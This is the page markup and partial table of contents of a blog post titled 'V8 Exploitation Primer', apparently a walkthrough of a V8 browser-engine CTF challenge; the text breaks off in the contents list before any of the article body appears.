<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>V8 Exploitation Primer &#183; suleif's blog</title><meta name=title content="V8 Exploitation Primer &#183; suleif's blog"><meta name=description content="This article introduces V8 and A small part of V8 exploitation"><meta name=keywords content="post,V8,security research,"><link rel=canonical href=https://suleif0.github.io/posts/v8-primer/><meta name=author content="suleif"><link href=https://github.com/loot01 rel=me><link href=https://twitter.com/proteinpowder00 rel=me><link href=https://www.linkedin.com/in/soulaimane-hafid-7638b8286/ rel=me><meta property="og:url" content="https://suleif0.github.io/posts/v8-primer/"><meta property="og:site_name" content="suleif's blog"><meta property="og:title" content="V8 Exploitation Primer"><meta property="og:description" content="This article introduces V8 and A small part of V8 exploitation"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-01-18T00:00:00+00:00"><meta property="article:modified_time" content="2026-01-18T00:00:00+00:00"><meta property="article:tag" content="Post"><meta property="article:tag" content="V8"><meta property="article:tag" content="Security Research"><meta name=twitter:card content="summary"><meta name=twitter:title content="V8 Exploitation Primer"><meta name=twitter:description content="This article introduces V8 and A small part of V8 exploitation"><link type=text/css rel=stylesheet href=/css/main.bundle.min.fc6219bc90238fee9b0eacb5e869ac71f831ea2c8a66ec98a69af1340225acff76762eaefad6190b02283789da553fedfc3768741dcddde07f10fc86e50eba49.css integrity="sha512-/GIZvJAjj+6bDqy16Gmscfgx6iyKZuyYpprxNAIlrP92di6u+tYZCwIoN4naVT/t/DdodB3N3eB/EPyG5Q66SQ=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.0e2e7ce1e319db5369cd4badb8265de52c78d08df54617521bdac9c8cd335eea6133a82c83f9cb19baf67b8133335130e7e8ff7cfeaf7171016648dbf5a0578a.js integrity="sha512-Di584eMZ21NpzUutuCZd5Sx40I31RhdSG9rJyM0zXuphM6gsg/nLGbr2e4EzM1Ew5+j/fP6vcXEBZkjb9aBXig==" data-copy=Copy data-copied=Copied></script><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"V8 Exploitation Primer","headline":"V8 Exploitation Primer","inLanguage":"en","url":"https://suleif0.github.io/posts/v8-primer/","author":{"@type":"Person","name":"suleif"},"copyrightYear":"2026","dateCreated":"2026-01-18T00:00:00\u002b00:00","datePublished":"2026-01-18T00:00:00\u002b00:00","dateModified":"2026-01-18T00:00:00\u002b00:00","keywords":["post","V8","security research"],"mainEntityOfPage":"true","wordCount":"6321"}]</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">suleif&rsquo;s blog</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/posts/ class="flex items-center bf-icon-color-hover" aria-label=Blog title=Posts><span class="text-base font-medium break-normal">Blog
</span></a><a href=https://github.com/loot01/ target=_blank class="flex items-center bf-icon-color-hover" aria-label=github title><span><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a href=https://www.linkedin.com/in/soulaimane-hafid-7638b8286/ target=_blank class="flex items-center bf-icon-color-hover" aria-label=linkedin title><span><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a><a href=https://twitter.com/proteinpowder00 target=_blank class="flex items-center bf-icon-color-hover" aria-label=twitter title><span><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/posts/ aria-label=Blog class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Posts class="text-2xl font-bold tracking-tight">Blog</span></a></div><div class=px-2><a href=https://github.com/loot01/ aria-label=github target=_blank class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span class="flex items-center justify-center h-8 w-8 text-2xl"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span><span title class="text-2xl font-bold tracking-tight"></span></a></div><div class=px-2><a href=https://www.linkedin.com/in/soulaimane-hafid-7638b8286/ aria-label=linkedin target=_blank class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span class="flex items-center justify-center h-8 w-8 text-2xl"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span><span title class="text-2xl font-bold tracking-tight"></span></a></div><div class=px-2><a href=https://twitter.com/proteinpowder00 aria-label=twitter target=_blank class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span class="flex items-center justify-center h-8 w-8 text-2xl"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span><span title class="text-2xl font-bold tracking-tight"></span></a></div></nav></div></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>suleif's blog</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/v8-primer/>V8 Exploitation Primer</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">V8 Exploitation Primer</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2026-01-18T00:00:00+00:00>18 January 2026</time><span class="px-2 text-primary-500">&#183;</span><span>6321 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">30 mins</span></div></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4" width=96 height=96 alt=suleif src=/img/klein_hu_902f8e4b2648533b.jpg data-zoom-src=/img/klein_hu_99c541f2a6cbbfa2.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">suleif</div><div class="text-sm text-neutral-700 dark:text-neutral-400">I love complex systems, and I love exploring their internals.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/loot01 target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://twitter.com/proteinpowder00 target=_blank aria-label=X-Twitter title=X-Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span></span></a>
<a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/soulaimane-hafid-7638b8286/ target=_blank aria-label=Linkedin title=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#v8-internals>V8 Internals</a><ul><li><a href=#lifecycle-of-a-javascript-program>Lifecycle of a javascript program</a></li><li><a href=#how-are-objects-stored-in-memory>How are objects stored in memory?</a></li><li><a href=#type-metadata-in-v8>Type metadata in V8</a></li><li><a href=#jsobject--jsarray>JSObject && JSArray</a></li></ul></li><li><a href=#vow-breaker-walkthrough>Vow Breaker walkthrough</a><ul><li><a href=#root-cause-analysis>Root cause analysis</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#addrof--fakeobj-primitives>addrof & fakeobj primitives</a></li><li><a href=#caged-arbitrary-read--write>Caged arbitrary read & write</a></li><li><a href=#code-execution-through-wasm-shellcode-smuggling>Code execution through WASM shellcode smuggling</a></li></ul></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#v8-internals>V8 Internals</a><ul><li><a href=#lifecycle-of-a-javascript-program>Lifecycle of a javascript program</a></li><li><a href=#how-are-objects-stored-in-memory>How are objects stored in memory?</a></li><li><a href=#type-metadata-in-v8>Type metadata in V8</a></li><li><a href=#jsobject--jsarray>JSObject && JSArray</a></li></ul></li><li><a href=#vow-breaker-walkthrough>Vow Breaker walkthrough</a><ul><li><a href=#root-cause-analysis>Root cause analysis</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#addrof--fakeobj-primitives>addrof & fakeobj primitives</a></li><li><a 